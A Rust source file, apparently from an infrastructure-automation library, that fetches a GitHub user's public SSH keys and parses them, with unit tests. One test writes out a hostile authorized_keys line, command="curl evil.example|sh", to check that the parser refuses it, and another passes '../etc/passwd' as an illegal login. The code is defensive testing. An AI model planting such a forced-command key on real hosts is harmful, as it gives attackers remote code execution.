//! [`UserKeys`]: a GitHub user's public SSH keys, as a read-only op.

use std::sync::Arc;
use std::time::Duration;

use rustible_sdk::prelude::*;
use rustible_std::ssh::authorized_keys::{PublicKey, parse_line};

use crate::fetch::{Fetch, Https};
use crate::login::validate_login;

/// Where `<login>.keys` is appended. GitHub serves a user's public keys as
/// `text/plain`, one `<type> <base64>` line per key, comments stripped.
pub const KEYS_URL_BASE: &str = "https://github.com";

/// Look up a GitHub user's public SSH keys. A read-only op (vision 6.5): it
/// runs through `ctx.step`, shows in the run output, is timed, and can never
/// report `changed`. Ansible has no single equivalent; the closest is
/// `lookup('url', 'https://github.com/<user>.keys')` plus `set_fact`, or
/// `ansible.posix.authorized_key` with `key: https://github.com/<user>.keys`
/// when the keys are only going into `authorized_keys` (see
/// [`github_ssh_keys_to_user`](crate::github_ssh_keys_to_user) for that case).
///
/// ```no_run
/// use rustible_sdk::prelude::*;
/// use rustible_github::UserKeys;
///
/// fn role(ctx: &mut Ctx) -> Result<()> {
///     let keys = ctx.step("Fetch flipbit03's keys", UserKeys::of("flipbit03"))?;
///     ctx.log(format!("{} key(s)", keys.len()));
///     Ok(())
/// }
/// ```
///
/// **Output**: `Vec<PublicKey>` in the order GitHub lists them, with
/// `options` and `comment` set to `None` (the `.keys` endpoint strips
/// comments). Feed them to `ssh::authorized_keys::Present` with
/// `k.to_line()`, or add a comment first.
///
/// **Under `--check` no request is sent** (vision 12): a dry run contacts
/// nothing outside the target. `check` never fetches, in either mode; the
/// request is `apply`'s. So a dry run reports the step `would change`, with
/// the URL as its diff and no output, and a later read of the keys ends the
/// enclosing `ctx.block` there with a warning. A real run fetches and
/// reports `ok`, never `changed`.
///
/// **Failure versus empty**: a login that is not legal (see
/// [`validate_login`]) fails at `check` without any request. A `404` fails
/// the step naming the user: the account does not exist. Any other non-`200`
/// status fails naming the status. A `200` with an empty body is a successful
/// step returning an empty `Vec`: the user exists and has published no keys.
/// A body line that is not a public key fails the step (a silently dropped
/// key would be worse, especially under `exclusive`).
///
/// **Where it runs**: on the target host, like every op. The target needs
/// HTTPS egress to `github.com`. Ansible's `lookup` runs on the controller;
/// this does not.
///
/// **Endpoint choice**: `https://github.com/<user>.keys` rather than the REST
/// API's `/users/<user>/keys`. The plain-text endpoint needs no token, no JSON
/// parsing, and is not subject to the API's 60-requests-per-hour anonymous
/// limit; the API adds only key ids, which nothing here needs.
#[derive(Debug, Clone)]
pub struct UserKeys {
    login: String,
    base: String,
    timeout: Option<Duration>,
    fetch: Option<Arc<dyn Fetch>>,
}

impl UserKeys {
    /// The keys of the GitHub user `login`. Validated at `check`, not here
    /// (constructing an op touches nothing, vision 6.2).
    pub fn of(login: impl Into<String>) -> Self {
        UserKeys {
            login: login.into(),
            base: KEYS_URL_BASE.to_string(),
            timeout: None,
            fetch: None,
        }
    }

    /// Timeout of the default HTTPS client, body included (20 seconds
    /// when not set). Ignored when [`fetch_with`](Self::fetch_with) is used.
    pub fn timeout(mut self, timeout: Duration) -> Self {
        self.timeout = Some(timeout);
        self
    }

    /// Perform the request through this [`Fetch`] instead of the default
    /// [`Https`] client: a proxy, a GitHub Enterprise base, or a canned
    /// answer in tests. The URL passed to it is [`url`](Self::url).
    pub fn fetch_with(mut self, fetch: impl Fetch + 'static) -> Self {
        self.fetch = Some(Arc::new(fetch));
        self
    }

    /// The GitHub login this op looks up.
    pub fn login(&self) -> &str {
        &self.login
    }

    /// Ask a different host for the keys: a GitHub Enterprise base, or a
    /// mirror. The URL becomes `<base>/<login>.keys`, with any trailing
    /// slash on `base` ignored. The response must still be the plain-text
    /// `.keys` format, and the options-field refusal in
    /// [`parse_keys_body`] applies to it exactly as it does to github.com.
    pub fn base_url(mut self, base: impl Into<String>) -> Self {
        self.base = base.into();
        self
    }

    /// The URL that will be requested: `<base>/<login>.keys`, where the base
    /// is `https://github.com` unless [`base_url`](Self::base_url) changed it.
    pub fn url(&self) -> String {
        format!("{}/{}.keys", self.base.trim_end_matches('/'), self.login)
    }

    fn fetcher(&self) -> Arc<dyn Fetch> {
        match &self.fetch {
            Some(f) => f.clone(),
            None => Arc::new(match self.timeout {
                Some(t) => Https::with_timeout(t),
                None => Https::new(),
            }),
        }
    }
}

/// Pure: parse the body of `https://github.com/<login>.keys` into keys.
/// Blank lines are skipped; any other line that is not a public key is an
/// error naming the line number and `login`. An empty body is `Ok(vec![])`.
///
/// **A line carrying an `authorized_keys` options field is refused.** The
/// endpoint serves bare `<type> <base64>` lines, so options can only come
/// from something that is not GitHub: a proxy, a caching layer, a Enterprise
/// host, or an attacker who can answer for one. Passing such a line through
/// would install `command="..."` or `no-pty` into the target's
/// `authorized_keys`, which is a remote-code-execution primitive dressed as a
/// key. Comments are dropped rather than refused: they are cosmetic, never
/// take part in matching, and the caller labels the keys itself.
pub fn parse_keys_body(login: &str, body: &str) -> Result<Vec<PublicKey>> {
    let mut keys = Vec::new();
    for (i, line) in body.lines().enumerate() {
        if line.trim().is_empty() {
            continue;
        }
        match parse_line(line) {
            Some(mut k) => {
                if let Some(options) = &k.options {
                    bail!(
                        "line {} of GitHub user `{login}`'s keys carries an authorized_keys \
                         options field ({options}); the `.keys` endpoint serves bare keys, so \
                         this response did not come from GitHub unaltered and is refused",
                        i + 1
                    );
                }
                k.comment = None;
                keys.push(k);
            }
            None => bail!(
                "line {} of GitHub user `{login}`'s keys is not a public key: {}",
                i + 1,
                line.trim()
            ),
        }
    }
    Ok(keys)
}

/// What [`UserKeys`]'s `check` decided: send `GET <url>`. It holds no keys,
/// because `check` reads none: they are remote state, and `check` contacts
/// nothing outside the target (vision 12).
#[derive(Debug)]
pub struct KeysLookup {
    url: String,
}

impl Intent for KeysLookup {
    /// The request and nothing else, because the step line shows it in
    /// both modes: under `--check` it is what the step would send, and in a
    /// real run, next to `ran, unchanged`, what it sent.
    fn diff(&self) -> Diff {
        Diff::summary(format!("GET {}", self.url))
    }
}

impl Op for UserKeys {
    type Output = Vec<PublicKey>;
    type Intent = KeysLookup;

    /// Contacts nothing, in either mode: the platform gate and the login's
    /// syntax are all it can judge without the request, and the request is
    /// `apply`'s. So `check` always plans it, and a dry run reports `would
    /// change` with no output, as for anything whose answer is remote state.
    fn check(&self, sys: &System) -> Result<Plan<Self>> {
        // Portable. github::UserKeys is an HTTPS GET parsed in Rust; nothing
        // touches the host but the network, which is why `sys` is otherwise
        // unused here. Declared anyway, as the worked example for a
        // collection: the supported set is a claim the author makes, not
        // something a reader infers from the absence of a check.
        match sys.facts().os {
            Os::Linux | Os::Macos => {}
            ref other => bail!(
                "github::UserKeys has no implementation for {}",
                other.name()
            ),
        }
        validate_login(&self.login)?;
        Ok(Plan::Change(KeysLookup { url: self.url() }))
    }

    /// The request, and everything that depends on its answer: the status,
    /// then the body.
    fn apply(&self, _: &System, intent: KeysLookup) -> Result<Vec<PublicKey>> {
        let KeysLookup { url } = intent;
        let resp = self.fetcher().get(&url)?;
        match resp.status {
            200 => parse_keys_body(&self.login, &resp.body),
            404 => bail!(
                "GitHub user `{}` does not exist (404 from {url}); an existing user with no keys \
                 would return an empty list, not an error",
                self.login
            ),
            s => bail!("GET {url} returned HTTP {s}"),
        }
    }

    /// A lookup changes nothing (vision 6.5): a real run reports it `ok`,
    /// with the note `ran, unchanged`.
    fn changed_by_apply(&self, _: &Vec<PublicKey>) -> bool {
        false
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use std::sync::{Arc, Mutex};

    use rustible_sdk::backend::Fake;
    use rustible_sdk::event::{Collect, Event, Status};
    use rustible_sdk::{Ctx, HostInfo};

    use super::*;
    use crate::fetch::Response;

    pub(crate) const RSA: &str = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyFAKEFAKE";
    pub(crate) const ED1: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMVhFAKEONE";
    pub(crate) const ED2: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICtDFAKETWO";

    /// What GitHub actually serves: one key per line, no comments, trailing
    /// newline.
    pub(crate) fn body() -> String {
        format!("{RSA}\n{ED1}\n{ED2}\n")
    }

    /// A [`Fetch`] answering from a table and recording every URL asked.
    #[derive(Debug, Default)]
    pub(crate) struct Canned {
        pub(crate) answers: Mutex<Vec<(String, Result<Response>)>>,
        pub(crate) asked: Mutex<Vec<String>>,
    }

    impl Canned {
        pub(crate) fn answering(url: &str, r: Result<Response>) -> Arc<Self> {
            let c = Canned::default();
            c.answers.lock().unwrap().push((url.to_string(), r));
            Arc::new(c)
        }

        pub(crate) fn asked(&self) -> Vec<String> {
            self.asked.lock().unwrap().clone()
        }
    }

    impl Fetch for Canned {
        fn get(&self, url: &str) -> Result<Response> {
            self.asked.lock().unwrap().push(url.to_string());
            let answers = self.answers.lock().unwrap();
            match answers.iter().find(|(u, _)| u == url) {
                Some((_, Ok(r))) => Ok(r.clone()),
                Some((_, Err(e))) => Err(Error::msg(e.chain())),
                None => Err(Error::msg(format!("Canned: no answer for {url}"))),
            }
        }
    }

    pub(crate) fn sys() -> (System, Arc<Collect>) {
        let sink = Arc::new(Collect::default());
        (System::fake(Arc::new(Fake::new()), sink.clone()), sink)
    }

    pub(crate) const URL_FOR_TESTS: &str = "https://github.com/flipbit03.keys";

    /// `check`, then `apply` on what it planned: the lookup a real run makes,
    /// without a `Ctx`. `check` contacts nothing, so it always plans.
    fn look_up(op: &UserKeys, sys: &System) -> Result<Vec<PublicKey>> {
        let Plan::Change(intent) = op.check(sys)? else {
            panic!("UserKeys::check always plans the request")
        };
        op.apply(sys, intent)
    }

    /// The one op in an external collection, so the worked example of the
    /// platform claim for collection authors: it runs on a mac (an HTTPS GET
    /// touches nothing on the host) and refuses a platform nobody claimed,
    /// and the refusal comes before the fetch — the canned fetcher records
    /// every URL asked, and after the refusal it has been asked nothing.
    #[test]
    fn runs_on_a_mac_and_refuses_an_unclaimed_platform() {
        let canned = Canned::answering(URL_FOR_TESTS, Ok(Response::ok(body())));
        let (base_sys, _) = sys();

        let mut mac = base_sys.facts().clone();
        mac.os = Os::Macos;
        let sys_mac = base_sys.clone().with_facts(mac);
        let op = UserKeys::of("flipbit03").fetch_with(canned.clone());
        let keys = look_up(&op, &sys_mac).unwrap();
        assert_eq!(keys.len(), 3);
        assert_eq!(canned.asked().len(), 1);

        let mut bsd = base_sys.facts().clone();
        bsd.os = Os::Other("freebsd".into());
        let sys_bsd = base_sys.with_facts(bsd);
        let err = UserKeys::of("flipbit03")
            .fetch_with(canned.clone())
            .check(&sys_bsd)
            .unwrap_err()
            .chain();
        assert!(
            err.contains("github::UserKeys has no implementation for freebsd"),
            "{err}"
        );
        assert_eq!(canned.asked().len(), 1, "the refusal asked for nothing");
    }

    fn finished(sink: &Collect) -> Vec<(String, Status)> {
        sink.events()
            .into_iter()
            .filter_map(|e| match e {
                Event::StepFinished { name, status, .. } => Some((name, status)),
                _ => None,
            })
            .collect()
    }

    // ---- pure ----

    #[test]
    fn base_url_points_at_another_host() {
        assert_eq!(
            UserKeys::of("cadu")
                .base_url("https://ghe.example.com")
                .url(),
            "https://ghe.example.com/cadu.keys"
        );
        // A trailing slash on the base does not double up.
        assert_eq!(
            UserKeys::of("cadu")
                .base_url("https://ghe.example.com/")
                .url(),
            "https://ghe.example.com/cadu.keys"
        );
    }

    #[test]
    fn url_is_the_keys_endpoint() {
        assert_eq!(
            UserKeys::of("flipbit03").url(),
            "https://github.com/flipbit03.keys"
        );
        assert_eq!(UserKeys::of("flipbit03").login(), "flipbit03");
    }

    #[test]
    fn parses_a_real_shaped_body() {
        let keys = parse_keys_body("flipbit03", &body()).unwrap();
        assert_eq!(keys.len(), 3);
        assert_eq!(keys[0].key_type, "ssh-rsa");
        assert_eq!(keys[1].key, "AAAAC3NzaC1lZDI1NTE5AAAAIMVhFAKEONE");
        assert!(
            keys.iter()
                .all(|k| k.comment.is_none() && k.options.is_none())
        );
        assert_eq!(keys[2].to_line(), ED2);
    }

    #[test]
    fn empty_body_is_no_keys_not_an_error() {
        assert_eq!(parse_keys_body("x", "").unwrap(), vec![]);
        assert_eq!(parse_keys_body("x", "\n\n").unwrap(), vec![]);
    }

    #[test]
    fn blank_lines_and_crlf_are_tolerated() {
        let keys = parse_keys_body("x", &format!("\n{ED1}\r\n\n{ED2}\r\n")).unwrap();
        assert_eq!(keys.len(), 2);
        assert_eq!(keys[1].to_line(), ED2);
    }

    #[test]
    fn a_non_key_line_fails_naming_line_and_user() {
        let e = parse_keys_body("flipbit03", &format!("{ED1}\n<html>Not Found</html>\n"))
            .unwrap_err()
            .chain();
        assert!(e.contains("line 2"), "{e}");
        assert!(e.contains("flipbit03"), "{e}");
        assert!(e.contains("<html>"), "{e}");
    }

    // ---- Fake backend, canned network ----

    #[test]
    fn an_options_field_in_the_response_is_refused() {
        // The `.keys` endpoint serves bare keys. An options field means the
        // body was rewritten somewhere between GitHub and here, and passing
        // it through would install a forced command in authorized_keys.
        let hostile = format!("command=\"curl evil.example|sh\",no-pty {ED1}\n{RSA}\n");
        let err = parse_keys_body("flipbit03", &hostile)
            .unwrap_err()
            .to_string();
        assert!(err.contains("options field"), "{err}");
        assert!(err.contains("line 1"), "{err}");
        assert!(err.contains("did not come from GitHub"), "{err}");

        // Also through the op, so the whole step fails rather than the key
        // list arriving half-sanitised.
        let fake = Arc::new(Fake::new());
        let sys = System::fake(fake, Arc::new(Collect::default()));
        let canned = Canned::answering(URL_FOR_TESTS, Ok(Response::ok(hostile)));
        let err = look_up(&UserKeys::of("flipbit03").fetch_with(canned), &sys)
            .unwrap_err()
            .to_string();
        assert!(err.contains("options field"), "{err}");
    }

    #[test]
    fn a_comment_in_the_response_is_dropped_not_kept() {
        // Comments are cosmetic and never take part in matching, so they are
        // stripped rather than refused: the caller labels the keys itself.
        let keys = parse_keys_body("flipbit03", &format!("{ED1} someone@laptop\n")).unwrap();
        assert_eq!(keys.len(), 1);
        assert_eq!(keys[0].comment, None);
        assert_eq!(keys[0].options, None);
    }

    /// A real run sends the request, in `apply`, and reports the lookup `ok`
    /// with the note `ran, unchanged`: never `changed` (vision 6.5).
    #[test]
    fn a_real_run_fetches_and_reports_ok_not_changed() {
        let canned = Canned::answering(
            "https://github.com/flipbit03.keys",
            Ok(Response::ok(body())),
        );
        let (sys, sink) = sys();
        let mut ctx = Ctx::new(sys, HostInfo::local());
        let keys = ctx
            .step(
                "Fetch keys",
                UserKeys::of("flipbit03").fetch_with(canned.clone()),
            )
            .unwrap();
        assert!(!keys.changed && keys.is_available());
        assert_eq!(keys.len(), 3);
        assert_eq!(keys[0].to_line(), RSA);
        assert_eq!(canned.asked(), vec!["https://github.com/flipbit03.keys"]);
        assert_eq!(
            finished(&sink),
            vec![("Fetch keys".to_string(), Status::Ok)]
        );
        let note = sink.events().into_iter().find_map(|e| match e {
            Event::StepFinished { note, .. } => note,
            _ => None,
        });
        assert_eq!(note.as_deref(), Some("ran, unchanged"));
    }

    #[test]
    fn empty_list_is_ok() {
        let canned = Canned::answering("https://github.com/nokeys.keys", Ok(Response::ok("")));
        let (sys, _) = sys();
        let op = UserKeys::of("nokeys").fetch_with(canned);
        assert!(look_up(&op, &sys).unwrap().is_empty());
    }

    /// The status is the answer to the request, so it is judged where the
    /// request is sent: `check` plans the lookup of a user who does not
    /// exist without asking anyone, and `apply` fails it.
    #[test]
    fn not_found_fails_in_apply_naming_the_user() {
        let canned = Canned::answering(
            "https://github.com/nobody-here.keys",
            Ok(Response::with_status(404, "Not Found")),
        );
        let (sys, sink) = sys();
        let op = UserKeys::of("nobody-here").fetch_with(canned.clone());
        let Plan::Change(intent) = op.check(&sys).unwrap() else {
            panic!("expected the request planned")
        };
        assert!(canned.asked().is_empty(), "check asked nobody");
        let e = op.apply(&sys, intent).unwrap_err().chain();
        assert!(
            e.contains("GitHub user `nobody-here` does not exist"),
            "{e}"
        );
        assert!(e.contains("404"), "{e}");
        assert_eq!(canned.asked().len(), 1);

        // And through a step, which fails rather than reporting anything.
        let mut ctx = Ctx::new(sys, HostInfo::local());
        let e = ctx
            .step("Fetch keys", UserKeys::of("nobody-here").fetch_with(canned))
            .unwrap_err()
            .chain();
        assert!(e.contains("does not exist"), "{e}");
        assert_eq!(
            finished(&sink),
            vec![("Fetch keys".to_string(), Status::Failed)]
        );
    }

    #[test]
    fn other_statuses_fail_naming_the_status() {
        let canned = Canned::answering(
            "https://github.com/flipbit03.keys",
            Ok(Response::with_status(503, "unavailable")),
        );
        let (sys, _) = sys();
        let e = look_up(&UserKeys::of("flipbit03").fetch_with(canned), &sys)
            .unwrap_err()
            .chain();
        assert!(e.contains("HTTP 503"), "{e}");
        assert!(e.contains("https://github.com/flipbit03.keys"), "{e}");
    }

    #[test]
    fn transport_errors_propagate() {
        let canned = Canned::answering(
            "https://github.com/flipbit03.keys",
            Err(Error::msg(
                "GET https://github.com/flipbit03.keys: dns error",
            )),
        );
        let (sys, _) = sys();
        let e = look_up(&UserKeys::of("flipbit03").fetch_with(canned), &sys)
            .unwrap_err()
            .chain();
        assert!(e.contains("dns error"), "{e}");
    }

    #[test]
    fn illegal_login_is_refused_before_any_request() {
        let canned = Arc::new(Canned::default());
        let (sys, _) = sys();
        for bad in ["", "cadu@x86", "-cadu", "../etc/passwd"] {
            let e = UserKeys::of(bad)
                .fetch_with(canned.clone())
                .check(&sys)
                .unwrap_err()
                .chain();
            assert!(e.contains("GitHub login"), "{bad}: {e}");
        }
        assert!(canned.asked().is_empty(), "no request may be made");
    }

    /// A dry run contacts nothing outside the target (vision 12): the canned
    /// fetcher, which would answer, is asked nothing. The step says what it
    /// would send and has no output, as for any would-change step.
    #[test]
    fn check_mode_fetches_nothing_and_has_no_output() {
        let canned = Canned::answering(
            "https://github.com/flipbit03.keys",
            Ok(Response::ok(body())),
        );
        let (sys, sink) = sys();
        let mut ctx = Ctx::new(sys.with_check_mode(true), HostInfo::local());
        let keys = ctx
            .step(
                "Fetch keys",
                UserKeys::of("flipbit03").fetch_with(canned.clone()),
            )
            .unwrap();
        assert!(canned.asked().is_empty(), "{:?}", canned.asked());
        assert!(keys.changed && !keys.is_available());
        assert_eq!(
            keys.diff.as_ref().unwrap().render(),
            "GET https://github.com/flipbit03.keys"
        );
        assert_eq!(
            finished(&sink),
            vec![("Fetch keys".to_string(), Status::WouldChange)]
        );
        // A lookup, not an action: no `action` note (`always_changes` is
        // false).
        let note = sink.events().into_iter().find_map(|e| match e {
            Event::StepFinished { note, .. } => Some(note),
            _ => None,
        });
        assert_eq!(note, Some(None));
    }

    /// `base_url` reaches the request `apply` sends, not just `url()`.
    #[test]
    fn base_url_is_the_host_apply_asks() {
        let url = "https://ghe.example.com/cadu.keys";
        let canned = Canned::answering(url, Ok(Response::ok(body())));
        let (sys, _) = sys();
        let op = UserKeys::of("cadu")
            .base_url("https://ghe.example.com/")
            .fetch_with(canned.clone());
        assert_eq!(look_up(&op, &sys).unwrap().len(), 3);
        assert_eq!(canned.asked(), vec![url]);
    }

    /// Real HTTPS through `ring` against GitHub. Not part of
    /// `cargo test` (the suite stays offline): run it with
    /// `cargo test -p rustible-github network_ -- --ignored`.
    #[test]
    #[ignore = "needs network: cargo test -p rustible-github network_ -- --ignored"]
    fn network_fetches_flipbit03_keys_over_https() {
        let (sys, _) = sys();
        let mut ctx = Ctx::new(sys, HostInfo::local());
        let keys = ctx.step("Fetch keys", UserKeys::of("flipbit03")).unwrap();
        assert!(!keys.changed);
        assert!(!keys.is_empty(), "flipbit03 has published keys");
        assert!(
            keys.iter()
                .all(|k| k.key_type.starts_with("ssh-") || k.key_type.starts_with("ecdsa-")),
            "{keys:?}"
        );

        let e = ctx
            .step(
                "Fetch missing",
                UserKeys::of("rustible-no-such-user-0000-xyz"),
            )
            .unwrap_err()
            .chain();
        assert!(e.contains("does not exist"), "{e}");
    }
}
